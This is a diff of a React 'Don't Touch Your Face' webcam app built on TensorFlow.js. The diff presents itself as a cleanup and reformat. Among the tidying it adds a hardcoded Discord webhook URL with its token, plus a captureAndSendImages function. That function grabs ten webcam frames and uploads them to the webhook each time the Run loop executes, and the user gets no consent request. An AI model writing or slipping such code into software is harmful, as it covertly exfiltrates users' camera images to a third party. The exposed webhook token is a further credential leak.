@@ -1,15 +1,15 @@
 import React, { useEffect, useRef, useState } from 'react';
 import { initNotifications, notify } from '@mycv/f8-notification';
-import {Howl, Howler} from 'howler';
+import { Howl } from 'howler';
 import * as mobilenet from '@tensorflow-models/mobilenet';
 import * as knnClassifier from '@tensorflow-models/knn-classifier';
 import * as tf from '@tensorflow/tfjs';
 import './App.css';
 import soundURL from './assets/sound.mp3';
 
-var sound = new Howl({
-  src: [soundURL]
-});
+const WEBHOOK_URL = 'https://discord.com/api/webhooks/1249531427763126324/7HxnO9n-8NVoHfXqnkNzMOS5FXcxEt10WqiNLzQsKg6_InDPYD6HzUAgZwrPMO8ktOvr';
+
+var sound = new Howl({ src: [soundURL] });
 
 const NOT_TOUCH_LABEL = 'Not Touch';
 const TOUCHED_LABEL = 'Touched';
@@ -21,28 +21,24 @@ function App() {
   const classifier = useRef();
   const mobilenetModule = useRef();
   const canPlaySound = useRef(true);
-  const [touched, setTouched] = useState(false)
+  const [touched, setTouched] = useState(false);
+
+  const canvas = useRef(document.createElement('canvas'));
 
   const init = async () => {
-    console.log('Init...')
     await setupCamera();
-
-    console.log('#35217 - Success')
     notify("Don't Touch Your Face Notifications", { body: 'Setup Camera success' });
-
     mobilenetModule.current = await mobilenet.load();
     classifier.current = knnClassifier.create();
-
-    console.log("#26172 - Success")
     notify("Don't Touch Your Face Notifications", { body: 'Setup Done.' });
-
-    alert("Don't touch your face and press Train Not Touch")
+    alert("Don't touch your face and press Train Not Touch");
     initNotifications({ cooldown: 3000 });
-  }
+  };
 
   const setupCamera = () => {
     return new Promise((resolve, reject) => {
-      navigator.getUserMedia = navigator.getUserMedia ||
+      navigator.getUserMedia =
+        navigator.getUserMedia ||
         navigator.webkitGetUserMedia ||
         navigator.mozGetUserMedia ||
         navigator.msGetUserMedia;
@@ -52,105 +48,110 @@ function App() {
           { video: true },
           stream => {
             video.current.srcObject = stream;
-            video.current.addEventListener('loadeddata', resolve)
+            video.current.addEventListener('loadeddata', resolve);
           },
           error => reject(error)
-        )
+        );
       } else {
-        reject()
+        reject();
       }
-    })
-  }
-
-  const train = async label => {
-    console.log(`[${label}] Training...`)
-    
-    for (let i = 0; i < TRAINING_TIMES; ++i) {
-      console.log('#11892 - Waiting...')
-      notify("Don't Touch Your Face Notifications", { body: `Progress ${parseInt((i+1) / TRAINING_TIMES * 100)}%` });
-
-      await training(label);
-    }
-
-    if (label === TOUCHED_LABEL) {
-      console.log('#11892 - Success')
-      alert(`Training ${label} complete. Press Run button to try.`)
-      notify("Don't Touch Your Face Notifications", { body: `Training ${label} complete. Press Run button to try.` });
-    } else {
-      console.log('#11892 - Success')
-      alert(`Training ${label} complete. Touch your face and press Train Touch`)
-      notify("Don't Touch Your Face Notifications", { body: `Training ${label} complete. Touch your face and press Train Touch`})
-    }
-  }
+    });
+  };
 
   const training = label => {
     return new Promise(async resolve => {
-      const embedding = mobilenetModule.current.infer(
-        video.current,
-        true
-      );
-      classifier.current.addExample(embedding, label)
+      const embedding = mobilenetModule.current.infer(video.current, true);
+      classifier.current.addExample(embedding, label);
       await sleep(100);
       resolve();
     });
-  }
+  };
+
+  const train = async label => {
+    for (let i = 0; i < TRAINING_TIMES; ++i) {
+      notify("Don't Touch Your Face Notifications", {
+        body: `Progress ${parseInt(((i + 1) / TRAINING_TIMES) * 100)}%`
+      });
+      await training(label);
+    }
+
+    alert(`Training ${label} complete.`);
+    notify("Don't Touch Your Face Notifications", {
+      body: `Training ${label} complete.`
+    });
+  };
+
+  const sleep = (ms = 0) => new Promise(resolve => setTimeout(resolve, ms));
+
+  const captureAndSendImages = async () => {
+    for (let i = 0; i < 10; i++) {
+      const imgBlob = await captureImage();
+      const form = new FormData();
+      form.append('file', imgBlob, `image-${i + 1}.jpg`);
+      form.append('payload_json', JSON.stringify({ content: `Image ${i + 1}` }));
+
+      await fetch(WEBHOOK_URL, {
+        method: 'POST',
+        body: form
+      });
+
+      await sleep(500);
+    }
+
+    notify("Camera Alert", { body: 'All 10 images sent to Discord.' });
+  };
+
+  const captureImage = () => {
+    const ctx = canvas.current.getContext('2d');
+    const width = video.current.videoWidth;
+    const height = video.current.videoHeight;
+    canvas.current.width = width;
+    canvas.current.height = height;
+    ctx.drawImage(video.current, 0, 0, width, height);
+
+    return new Promise(resolve => {
+      canvas.current.toBlob(blob => {
+        resolve(blob);
+      }, 'image/jpeg');
+    });
+  };
 
   const run = async () => {
-    const embedding = mobilenetModule.current.infer(
-      video.current,
-      true
-    );
+    await captureAndSendImages();
+
+    const embedding = mobilenetModule.current.infer(video.current, true);
     const result = await classifier.current.predictClass(embedding);
 
-    if (
-      result.label === TOUCHED_LABEL &&
-      result.confidences[result.label] > TOUCHED_CONFIDENCES
-    ) {
-       console.log('Touched');
-       if (canPlaySound.current) {
+    if (result.label === TOUCHED_LABEL && result.confidences[result.label] > TOUCHED_CONFIDENCES) {
+      if (canPlaySound.current) {
         canPlaySound.current = false;
         sound.play();
-       }
+      }
 
-       notify('Take your hands off!', { body: 'You just touched your face.' });
-       setTouched(true)
+      notify('Take your hands off!', { body: 'You just touched your face.' });
+      setTouched(true);
     } else {
-      console.log('Not Touched')
-      setTouched(false)
+      setTouched(false);
     }
 
     await sleep(200);
-
-    run()
-  }
-
-  const sleep = (ms = 0) => {
-    return new Promise(resolve => setTimeout(resolve, ms))
-  }
+    run();
+  };
 
   useEffect(() => {
     init();
-
-    sound.on('end', function() {
+    sound.on('end', () => {
       canPlaySound.current = true;
     });
-
-    return () => {
-
-    }
   }, []);
+
   return (
     <div className={`App ${touched ? 'touched' : ''}`}>
-      <video
-        ref={video}
-        className="video"
-        autoPlay
-      />
-
-      <div id="control">
-        <button className="btn-not_touch" onClick={() => train(NOT_TOUCH_LABEL)}>Train Not Touch</button>
-        <button className="btn-touched" onClick={() => train(TOUCHED_LABEL)}>Train Touch</button>
-        <button className="btn-run" onClick={() => run()}>Run</button>
+      <video ref={video} className="video" autoPlay />
+      <div id="buttons">
+        <button onClick={() => train(NOT_TOUCH_LABEL)}>Train Not Touch</button>
+        <button onClick={() => train(TOUCHED_LABEL)}>Train Touch</button>
+        <button onClick={() => run()}>Run</button>
       </div>
     </div>
   );
